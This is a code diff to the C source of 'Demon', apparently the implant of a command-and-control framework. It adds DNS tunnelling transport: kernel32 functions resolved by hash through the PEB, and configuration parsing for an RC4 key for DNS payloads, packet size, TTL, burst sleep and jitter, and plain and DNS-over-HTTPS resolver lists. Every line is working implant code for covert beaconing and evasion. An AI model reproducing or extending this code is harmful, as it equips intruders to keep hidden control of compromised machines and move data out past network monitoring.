@@ -402,6 +402,10 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* load kernel32.dll functions */
     if ( ( Instance->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
         Instance->Win32.LoadLibraryW                    = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_LOADLIBRARYW );
+#ifdef TRANSPORT_DNS
+        Instance->Win32.GetTickCount                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETTICKCOUNT );
+        Instance->Win32.Sleep                          = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_SLEEP );
+#endif
         Instance->Win32.VirtualProtectEx                = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
         Instance->Win32.VirtualProtect                  = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
         Instance->Win32.LocalAlloc                      = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_LOCALALLOC );
@@ -813,6 +817,45 @@ VOID DemonConfig()
         Instance->Win32.RtlExitUserThread(0);
     }
     Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
+
+    /* RC4 key of the DNS payloads */
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Buffer && Length == 16 )
+    {
+        MemCopy( Instance->Config.Transport.EncryptKey, Buffer, 16 );
+    }
+    else
+    {
+        PUTS( "[CONFIG] [DNS] invalid encrypt key" )
+    }
+
+    Instance->Config.Transport.PktSize = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] [DNS] PktSize: %d\n", Instance->Config.Transport.PktSize );
+
+    Instance->Config.Transport.TTL = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] [DNS] TTL: %d\n", Instance->Config.Transport.TTL );
+
+    Instance->Config.Transport.BurstEnabled = ( BOOL ) ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] [DNS] BurstEnabled: %s\n", Instance->Config.Transport.BurstEnabled ? "TRUE" : "FALSE" );
+
+    Instance->Config.Transport.BurstSleep = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] [DNS] BurstSleep: %d\n", Instance->Config.Transport.BurstSleep );
+
+    Instance->Config.Transport.BurstJitter = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] [DNS] BurstJitter: %d\n", Instance->Config.Transport.BurstJitter );
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.Resolvers = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+    if ( Buffer && Length )
+        MemCopy( Instance->Config.Transport.Resolvers, Buffer, Length );
+    PRINTF( "[CONFIG] [DNS] Resolvers: %ls\n", Instance->Config.Transport.Resolvers );
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.DohResolvers = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+    if ( Buffer && Length )
+        MemCopy( Instance->Config.Transport.DohResolvers, Buffer, Length );
+    PRINTF( "[CONFIG] [DNS] DohResolvers: %ls\n", Instance->Config.Transport.DohResolvers );
+
 #endif
 
     Instance->Config.Implant.ThreadStartAddr = Instance->Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
